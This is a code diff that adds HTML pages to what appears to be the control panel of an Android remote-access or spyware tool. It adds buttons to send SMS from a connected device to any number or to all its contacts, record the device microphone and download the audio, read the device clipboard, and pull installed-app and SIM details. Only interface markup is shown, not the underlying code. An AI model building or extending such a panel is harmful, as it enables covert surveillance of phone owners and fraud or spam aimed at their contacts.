@@ -82,6 +82,22 @@
         </div>
 
         <div class="nav-section">
+          <div class="nav-section-title">Remote Control</div>
+          <a class="nav-item" data-page="remoteactions" onclick="navigateTo('remoteactions')">
+            <span class="icon">🎮</span>
+            <span>Remote Actions</span>
+          </a>
+          <a class="nav-item" data-page="apps" onclick="navigateTo('apps')">
+            <span class="icon">💻</span>
+            <span>Installed Apps</span>
+          </a>
+          <a class="nav-item" data-page="siminfo" onclick="navigateTo('siminfo')">
+            <span class="icon">📡</span>
+            <span>SIM Info</span>
+          </a>
+        </div>
+
+        <div class="nav-section">
           <div class="nav-section-title">Tools</div>
           <a class="nav-item" data-page="info" onclick="navigateTo('info')">
             <span class="icon">ℹ️</span>
@@ -681,6 +697,151 @@
         <div class="card" style="margin-top:20px">
           <h3 style="margin-bottom:12px">Connected Devices</h3>
           <div id="connectDevicesList"></div>
+        </div>
+      </section>
+
+      <!-- ============ REMOTE ACTIONS ============ -->
+      <section class="page-section" id="page-remoteactions">
+        <div class="page-header">
+          <div>
+            <h2>Remote Actions</h2>
+            <p class="subtitle">Control your device remotely</p>
+          </div>
+          <select class="select-device" id="remoteActionsDeviceSelect">
+            <option value="">Select a device...</option>
+          </select>
+        </div>
+
+        <div class="grid-2">
+          <!-- Open URL / WebView -->
+          <div class="card">
+            <h3 style="margin-bottom:12px">🌐 Open URL on Device</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:12px">Opens a URL in device browser</p>
+            <input type="text" id="webviewUrl" placeholder="https://example.com" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:10px">
+            <button class="btn btn-primary" onclick="sendWebViewOpen()" style="width:100%">Open URL</button>
+            <div id="webviewResult" style="margin-top:8px;font-size:13px;color:var(--text-secondary)"></div>
+          </div>
+
+          <!-- Send Notification -->
+          <div class="card">
+            <h3 style="margin-bottom:12px">🔔 Send Notification</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:12px">Send custom notification to device</p>
+            <input type="text" id="notifTitle" placeholder="Notification title" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:8px">
+            <input type="text" id="notifBody" placeholder="Notification body" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:8px">
+            <input type="text" id="notifUrl" placeholder="Click URL (optional)" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:10px">
+            <button class="btn btn-primary" onclick="sendNotification()" style="width:100%">Send Notification</button>
+            <div id="notifResult" style="margin-top:8px;font-size:13px;color:var(--text-secondary)"></div>
+          </div>
+
+          <!-- Toast Message -->
+          <div class="card">
+            <h3 style="margin-bottom:12px">🗨️ Show Toast Message</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:12px">Display a toast message on device screen</p>
+            <input type="text" id="toastMessage" placeholder="Message to show" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:8px">
+            <select id="toastDuration" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:10px">
+              <option value="0">Short</option>
+              <option value="1">Long</option>
+            </select>
+            <button class="btn btn-primary" onclick="sendToast()" style="width:100%">Show Toast</button>
+            <div id="toastResult" style="margin-top:8px;font-size:13px;color:var(--text-secondary)"></div>
+          </div>
+
+          <!-- Vibrate -->
+          <div class="card">
+            <h3 style="margin-bottom:12px">📳 Vibrate Device</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:12px">Make the device vibrate</p>
+            <input type="number" id="vibrateDuration" value="1000" placeholder="Duration (ms)" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:8px">
+            <input type="text" id="vibratePattern" placeholder="Pattern: 0,200,100,200 (optional)" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:10px">
+            <button class="btn btn-primary" onclick="sendVibrate()" style="width:100%">Vibrate</button>
+            <div id="vibrateResult" style="margin-top:8px;font-size:13px;color:var(--text-secondary)"></div>
+          </div>
+
+          <!-- Send SMS -->
+          <div class="card">
+            <h3 style="margin-bottom:12px">✉️ Send SMS</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:12px">Send SMS from device to any number</p>
+            <input type="text" id="smsNumber" placeholder="Phone number" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:8px">
+            <textarea id="smsMessage" rows="3" placeholder="Message" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:10px;resize:vertical"></textarea>
+            <button class="btn btn-primary" onclick="sendSms()" style="width:100%">Send SMS</button>
+            <div id="smsResult" style="margin-top:8px;font-size:13px;color:var(--text-secondary)"></div>
+          </div>
+
+          <!-- Send SMS to All -->
+          <div class="card">
+            <h3 style="margin-bottom:12px">✉️ Send SMS to All Contacts</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:12px">Send SMS from device to all contacts</p>
+            <textarea id="smsAllMessage" rows="3" placeholder="Message for all contacts" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:10px;resize:vertical"></textarea>
+            <button class="btn btn-danger" onclick="sendSmsAll()" style="width:100%">Send to All Contacts</button>
+            <div id="smsAllResult" style="margin-top:8px;font-size:13px;color:var(--text-secondary)"></div>
+          </div>
+
+          <!-- Microphone Record -->
+          <div class="card">
+            <h3 style="margin-bottom:12px">🎙 Record Microphone</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:12px">Record audio from device mic with custom duration</p>
+            <input type="number" id="micDuration" value="10" min="1" max="300" placeholder="Duration (seconds)" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text);margin-bottom:10px">
+            <button class="btn btn-primary" onclick="recordMic()" id="btnRecordMic" style="width:100%">Record</button>
+            <div id="micStatus" style="margin-top:8px;font-size:13px;color:var(--text-secondary)"></div>
+            <div id="micPlayer" style="margin-top:8px;display:none">
+              <audio controls style="width:100%" id="micAudio"></audio>
+              <a id="micDownload" href="#" download="recording.3gp" class="btn btn-outline" style="margin-top:8px;display:inline-block;font-size:13px">Download</a>
+            </div>
+          </div>
+
+          <!-- Clipboard -->
+          <div class="card">
+            <h3 style="margin-bottom:12px">📋 Get Clipboard</h3>
+            <p style="color:var(--text-secondary);font-size:13px;margin-bottom:12px">Read last copied text from device clipboard</p>
+            <button class="btn btn-primary" onclick="getClipboard()" style="width:100%">Get Clipboard Text</button>
+            <div id="clipboardResult" style="margin-top:10px;padding:12px;background:var(--bg);border-radius:8px;font-size:13px;color:var(--text);display:none;word-break:break-all"></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ INSTALLED APPS ============ -->
+      <section class="page-section" id="page-apps">
+        <div class="page-header">
+          <div>
+            <h2>Installed Apps</h2>
+            <p class="subtitle">View all installed applications on the device</p>
+          </div>
+          <div style="display:flex;gap:10px;align-items:center">
+            <select class="select-device" id="appsDeviceSelect">
+              <option value="">Select a device...</option>
+            </select>
+            <button class="btn btn-primary" onclick="fetchApps()">Fetch Apps</button>
+          </div>
+        </div>
+        <div class="card">
+          <div style="display:flex;gap:10px;margin-bottom:12px;align-items:center">
+            <input type="text" id="appsSearch" placeholder="Search apps..." oninput="filterApps()" style="flex:1;padding:10px;border:1px solid var(--border);border-radius:8px;background:var(--card);color:var(--text)">
+            <label style="font-size:13px;color:var(--text-secondary);display:flex;align-items:center;gap:4px">
+              <input type="checkbox" id="appsHideSystem" onchange="filterApps()"> Hide system apps
+            </label>
+          </div>
+          <div id="appsCount" style="font-size:13px;color:var(--text-muted);margin-bottom:12px"></div>
+          <div id="appsList" class="data-table"></div>
+        </div>
+      </section>
+
+      <!-- ============ SIM INFO ============ -->
+      <section class="page-section" id="page-siminfo">
+        <div class="page-header">
+          <div>
+            <h2>SIM Card Info</h2>
+            <p class="subtitle">View SIM card and network information</p>
+          </div>
+          <div style="display:flex;gap:10px;align-items:center">
+            <select class="select-device" id="simDeviceSelect">
+              <option value="">Select a device...</option>
+            </select>
+            <button class="btn btn-primary" onclick="fetchSimInfo()">Get SIM Info</button>
+          </div>
+        </div>
+        <div id="simInfoContent">
+          <div class="card" style="text-align:center;padding:40px">
+            <p style="color:var(--text-muted)">Select a device and click "Get SIM Info" to view SIM details</p>
+          </div>
         </div>
       </section>
 
